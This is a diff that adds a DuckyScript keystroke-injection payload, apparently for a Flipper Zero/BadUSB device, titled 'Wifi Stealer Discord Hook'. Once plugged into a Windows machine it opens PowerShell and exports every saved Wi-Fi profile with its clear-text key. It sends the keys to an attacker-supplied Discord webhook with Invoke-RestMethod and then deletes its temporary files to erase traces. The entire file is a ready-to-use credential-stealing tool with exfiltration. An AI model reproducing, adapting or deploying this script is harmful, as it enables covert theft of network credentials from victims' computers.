@@ -1,0 +1,37 @@
+REM Title: Wifi Stealer Discord Hook 
+REM Author: 7h30th3r0n3
+REM Reworked: the0bone 
+REM Discord exfiltation rework: Blobs0
+REM Hosted : https://github.com/UberGuidoZ/Flipper/
+REM Target:  Windows 7/8/10/11 
+REM Supported Layout keyboard: US/FR/DE
+REM Version: 1.0
+REM Category: Grabber
+REM Extracts the SSID and wifi shared key and puts them in a txt file named 0.txt on the desktop and send it to discord webhook 
+GUI r
+DELAY 500
+STRING powershell 
+ENTER
+DELAY 2000
+REM setting variable
+STRING $desktop = ([Environment]::GetFolderPath("Desktop"))
+ENTER
+REM Creating a new folder in Temp with random name to store the xml files and create single text file
+STRING New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"; Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear; Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt
+ENTER
+REM set your discord webhook link here (replace <your-key)
+STRING $webhookUri = $desktop = ([Environment]::GetFolderPath("Desktop"));$webhookUri = 'https://discord.com/api/webhooks/<your-key>'; $filePath = "$desktop\0.txt"; $fileContent = Get-Content -Path $filePath | Out-String
+ENTER 
+REM set js variable
+STRING $Body = @{
+SHIFT ENTER 
+STRING 'username' = 'Wifi_Stealer'
+SHIFT ENTER
+STRING   'content' = $fileContent
+SHIFT ENTER
+STRING }
+SHIFT ENTER 
+ENTER
+REM Send to your discord webhook and remove all the file
+STRING Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body;Set-Location -Path "$env:temp"; Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt; exit
+ENTER
